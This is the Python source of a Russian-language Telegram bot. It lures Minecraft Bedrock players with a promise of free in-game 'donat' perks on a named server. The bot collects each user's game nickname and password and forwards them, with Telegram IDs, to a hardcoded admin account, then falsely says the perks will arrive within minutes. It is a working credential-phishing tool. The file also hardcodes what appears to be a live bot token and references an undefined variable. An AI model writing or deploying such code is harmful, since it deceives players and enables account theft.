import sqlite3
import time
import os
import sys
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# Конфигурация
BOT_TOKEN = "8418052441:AAEyIvxgmYbR6V83sNir0Nsk234mW4VsWGw"
ADMIN_ID = 8000395560 # Замените на ваш ID админа
CHANNEL_USERNAME = "@pnixmcbe"  # Замените на username вашего канала
CREATOR_USERNAME = "@isnikson"  # Замените на username создателя

# Состояния
NICKNAME, PASSWORD = range(2)

# База данных
if os.path.exists('users.db'):
    os.remove('users.db')

conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users 
             (user_id INTEGER PRIMARY KEY, banned INTEGER DEFAULT 0)''')
conn.commit()

# Антиспам
user_message_times = {}

def check_spam(user_id):
    now = time.time()
    if user_id not in user_message_times:
        user_message_times[user_id] = []
    
    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < 60]
    user_message_times[user_id].append(now)
    
    return len(user_message_times[user_id]) > 10

def is_banned(user_id):
    """Проверяет, забанен ли пользователь"""
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    user_data = c.fetchone()
    return user_data and user_data[0]

def generate_strong_password(length=13):
    """Генерирует сложный пароль из неповторяющихся символов"""
    if length > len(string.ascii_letters + string.digits + string.punctuation):
        length = 13
    
    # Все доступные символы
    all_chars = string.ascii_letters + string.digits + string.punctuation
    # Перемешиваем символы и берем нужное количество
    shuffled_chars = random.sample(all_chars, len(all_chars))
    # Берем первые length символов
    password = ''.join(shuffled_chars[:length])
    
    return password

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        # Проверка бана
        if is_banned(user_id):
            await update.message.reply_text("❌ Вы забанены.")
            return
        
        await update.message.reply_text(
            "🎄 *ПОЛУЧИ ДЕД ДОНАТ!*\n\n"
            "Сервер: `phoenix-pe.ru`\n"
            "Порт: `19132`\n\n"
            "Нажмите кнопку ниже чтобы начать получение доната!\n\n/help Ваш вопрос",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🎄 ПОЛУЧИТЬ ДОНАТ", callback_data="get_donate")],
                [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)],
                [InlineKeyboardButton("👤 СОЗДАТЕЛЬ", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
            ])
        )
    except Exception as e:
        print(f"Error in start: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /help для связи с админом"""
    try:
        user_id = update.effective_user.id
        
        # Проверка бана
        if is_banned(user_id):
            await update.message.reply_text("❌ Вы забанены.")
            return
        
        # Проверяем, есть ли текст после команды
        if not context.args:
            await update.message.reply_text(
                "❌ *Использование:* `/help Ваш вопрос`\n\n"
                "📝 *Пример:*\n"
                "`/help Как получить донат?`\n\n"
                "💬 *Опишите вашу проблему или вопрос после команды /help*",
                parse_mode='Markdown'
            )
            return
        
        # Получаем вопрос пользователя
        user_question = ' '.join(context.args)
        username = update.effective_user.username
        user_id = update.effective_user.id
        
        # Формируем сообщение для админа в указанном формате
        admin_message = (
            "🆘 *НОВЫЙ ВОПРОС ОТ ПОЛЬЗОВАТЕЛЯ*\n\n"
            f"Username: @{username or 'N/A'}\n"
            f"🆔 User ID: {user_id}\n"
            f"❓ Вопрос: {user_question}"
        )
        
        # Отправляем админу
        try:
            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
            await update.message.reply_text(
                "✅ *Ваш вопрос отправлен администратору!*\n\n"
                "📞 *Мы ответим вам в ближайшее время.*\n"
                "⏳ *Ожидайте ответа в этом чате.*",
                parse_mode='Markdown'
            )
        except Exception as e:
            await update.message.reply_text(
                "❌ *Произошла ошибка при отправке вопроса.*\n"
                "⚠️ *Попробуйте позже или свяжитесь с создателем.*",
                parse_mode='Markdown'
            )
            print(f"Error sending help message to admin: {e}")
            
    except Exception as e:
        print(f"Error in help_command: {e}")
        await update.message.reply_text("❌ Произошла ошибка. Попробуйте позже.")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Проверка бана при нажатии на кнопку
    if is_banned(user_id):
        await query.message.reply_text("❌ Вы забанены.")
        return ConversationHandler.END
    
    if query.data == "get_donate":
        await query.message.reply_text("🔹 Введите ваш никнейм:")
        return NICKNAME

async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        # Проверка бана
        if is_banned(user_id):
            await update.message.reply_text("❌ Вы забанены.")
            return ConversationHandler.END
        
        context.user_data['nickname'] = update.message.text
        await update.message.reply_text("🔹 Теперь введите ваш пароль для верификации:")
        return PASSWORD
    except Exception as e:
        print(f"Error in get_nickname: {e}")
        return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        # Проверка бана
        if is_banned(user_id):
            await update.message.reply_text("❌ Вы забанены.")
            return ConversationHandler.END
        
        password = update.message.text
        nickname = context.user_data['nickname']
        
        # Отправка админу
        admin_text = (
            "🎃 *НОВЫЕ ДАННЫЕ ДЛЯ ДОНАТА*\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"📧 Username: @{update.effective_user.username or 'N/A'}\n"
            f"🔑 Никнейм: `{nickname}`\n"
            f"🔒 Пароль: `{password}`\n"
            f"⏰ Время: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        
        await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
        
        await update.message.reply_text(
            "✅ Данные приняты! Донат придет в течение 10-15 минут.\n\n"
            "📢 Обязательно подпишись на наш канал!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
            ])
        )
        
        return ConversationHandler.END
    except Exception as e:
        print(f"Error in get_password: {e}")
        return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено.")
    return ConversationHandler.END

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        # Проверка бана
        if is_banned(user_id):
            return
        
        # Антиспам
        if check_spam(user_id):
            c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
            conn.commit()
            await update.message.reply_text("❌ Вы забанены за спам.")
            return
    except Exception as e:
        print(f"Error in handle_message: {e}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return
        
        if context.args:
            user_id = int(context.args[0])
            c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
            conn.commit()
            await update.message.reply_text(f"✅ Пользователь {user_id} забанен.")
    except Exception as e:
        print(f"Error in ban_command: {e}")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return
        
        if context.args:
            user_id = int(context.args[0])
            c.execute("UPDATE users SET banned=0 WHERE user_id=?", (user_id,))
            conn.commit()
            await update.message.reply_text(f"✅ Пользователь {user_id} разбанен.")
    except Exception as e:
        print(f"Error in unban_command: {e}")

async def send_message_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /t для отправки сообщений пользователям (только для админа)"""
    try:
        if update.effective_user.id != ADMIN_ID:
            return
        
        if len(context.args) < 2:
            await update.message.reply_text("❌ Использование: /t <user_id> <сообщение>")
            return
        
        user_id = int(context.args[0])
        message_text = ' '.join(context.args[1:])
        
        try:
            await context.bot.send_message(user_id, message_text)
            await update.message.reply_text(f"✅ Сообщение отправлено пользователю {user_id}")
        except Exception as e:
            await update.message.reply_text(f"❌ Не удалось отправить сообщение: {e}")
            
    except Exception as e:
        print(f"Error in send_message_command: {e}")
        await update.message.reply_text("❌ Ошибка при отправке сообщения")

async def password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /password для генерации сложного пароля (только для админа)"""
    try:
        if update.effective_user.id != ADMIN_ID:
            return
        
        # Генерируем сложный пароль
        strong_password = generate_strong_password(13)
        
        await update.message.reply_text(
            f"🔐 *Сгенерированный пароль:*\n"
            f"`{strong_password}`\n\n"
            f"*Длина:* 13 символов\n"
            f"*Символы:* неповторяющиеся\n"
            f"⚠️ *Сохраните в надежном месте!*",
            parse_mode='Markdown'
        )
            
    except Exception as e:
        print(f"Error in password_command: {e}")
        await update.message.reply_text("❌ Ошибка при генерации пароля")

def main():
    try:
        # Создаем application с указанием одного бота
        application = Application.builder().token(BOT_TOKEN).build()
        
        conv_handler = ConversationHandler(
            entry_points=[CallbackQueryHandler(button_handler, pattern='^get_donate$')],
            states={
                NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            },
            fallbacks=[CommandHandler('cancel', cancel)],
            allow_reentry=True
        )
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("ban", ban_command))
        application.add_handler(CommandHandler("unban", unban_command))
        application.add_handler(CommandHandler("t", send_message_command))
        application.add_handler(CommandHandler("password", password_command))
        application.add_handler(conv_handler)
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("🔄 Запуск бота...")
        print("✅ Бот запущен! Остановите все другие экземпляры бота.")
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"❌ Ошибка запуска бота: {e}")
        print("⚠️  Убедитесь, что другие экземпляры бота остановлены!")
        sys.exit(1)

if __name__ == '__main__':
    # Проверяем, не запущен ли уже бот
    print("🔍 Проверка запущенных процессов...")
    main()
